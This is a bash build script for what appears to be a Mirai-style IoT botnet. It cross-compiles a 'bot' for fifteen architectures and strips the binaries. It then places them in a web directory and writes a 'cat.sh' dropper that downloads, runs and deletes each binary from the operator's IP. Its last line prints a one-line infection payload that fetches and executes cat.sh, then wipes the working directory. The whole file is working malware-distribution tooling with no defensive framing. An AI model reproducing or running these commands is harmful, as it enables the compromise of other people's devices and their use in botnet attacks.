#!/bin/bash

cd bot

# Build for each arch
powerpc-gcc *.c -o powerpc -DARCH_powerpc -pthread -static -O3 -ffunction-sections -Wl,--gc-sections -std=c99
mips-gcc *.c -o mips -DARCH_mips -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
mipsel-gcc *.c -o mipsel -DARCH_mipsel -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
x86_64-gcc *.c -o x86_64 -DARCH_x86_64 -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
m68k-gcc *.c -o m68k -DARCH_m68k -static -lpthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
sparc-gcc *.c -o sparc -DARCH_sparc -static -lpthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
i486-gcc *.c -o i486 -DARCH_i486 -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
aarch64-linux-gcc *.c -o aarch64 -DARCH_aarch64 -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
armv4l-gcc *.c -o armv4l -DARCH_armv4l -static -lpthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
armv5l-gcc *.c -o armv5l -DARCH_armv5l -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
armv6l-gcc *.c -o armv6l -DARCH_armv6l -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
armv7l-gcc *.c -o armv7l -DARCH_armv7l -static -lpthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
sh4-gcc *.c -o sh4 -DARCH_sh4 -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
arc-linux-gcc *.c -o arc -DARCH_arc -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99
csky-linux-gcc *.c -o csky -DARCH_csky -static -pthread -O3 -ffunction-sections -Wl,--gc-sections -std=c99

# strip bins
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr powerpc
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr mipsel
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr x86_64
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr m68k
sparc-strip --strip-unneeded sparc
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr i486
aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr aarch64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv4l
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv5l
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv6l
armv7l-strip --strip-unneeded armv7l
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr sh4
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr arc
csky-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr csky

# Move binaries to web dir
mv powerpc mips mipsel x86_64 m68k sparc i486 aarch64 armv4l armv5l armv6l armv7l sh4 arc csky /var/www/html 2>/dev/null

cd ..

IP=$(curl -s ifconfig.me)
cat <<EOF >/var/www/html/cat.sh
#!/bin/bash
wget http://$IP/x86_64 -O x86_64 || curl http://$IP/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64
wget http://$IP/aarch64 -O aarch64 || curl http://$IP/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64; rm -rf aarch64
wget http://$IP/m68k -O m68k || curl http://$IP/m68k -o m68k; chmod 777 m68k; ./m68k; rm -rf m68k
wget http://$IP/mips -O mips || curl http://$IP/mips -o mips; chmod 777 mips; ./mips; rm -rf mips
wget http://$IP/mipsel -O mipsel || curl http://$IP/mipsel -o mipsel; chmod 777 mipsel; ./mipsel; rm -rf mipsel
wget http://$IP/powerpc -O powerpc || curl http://$IP/powerpc -o powerpc; chmod 777 powerpc; ./powerpc; rm -rf powerpc
wget http://$IP/sparc -O sparc || curl http://$IP/sparc -o sparc; chmod 777 sparc; ./sparc; rm -rf sparc
wget http://$IP/sh4 -O sh4 || curl http://$IP/sh4 -o sh4; chmod 777 sh4; ./sh4; rm -rf sh4
wget http://$IP/arc -O arc || curl http://$IP/arc -o arc; chmod 777 arc; ./arc; rm -rf arc
wget http://$IP/csky -O csky || curl http://$IP/csky -o csky; chmod 777 csky; ./csky; rm -rf csky
wget http://$IP/i486 -O i486 || curl http://$IP/i486 -o i486; chmod 777 i486; ./i486; rm -rf i486
wget http://$IP/armv4l -O armv4l || curl http://$IP/armv4l -o armv4l; chmod 777 armv4l; ./armv4l; rm -rf armv4l
wget http://$IP/armv5l -O armv5l || curl http://$IP/armv5l -o armv5l; chmod 777 armv5l; ./armv5l; rm -rf armv5l
wget http://$IP/armv6l -O armv6l || curl http://$IP/armv6l -o armv6l; chmod 777 armv6l; ./armv6l; rm -rf armv6l
wget http://$IP/armv7l -O armv7l || curl http://$IP/armv7l -o armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l
/var/wii 2>/dev/null &
EOF

echo "payload: cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat1.sh; rm -rf *"

exit 0
